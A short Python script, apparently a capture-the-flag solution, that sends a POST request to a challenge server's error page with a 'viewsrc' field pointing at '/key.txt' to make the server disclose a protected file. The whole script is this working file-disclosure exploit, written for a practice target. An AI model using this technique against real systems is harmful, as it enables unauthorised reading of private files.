import requests

URL = "http://challenges.0x0539.net:3012/error.html"

DATA = {'key' : "0", 'viewsrc' : "/key.txt"}

resp = requests.post(URL, data=DATA)

print(resp.text)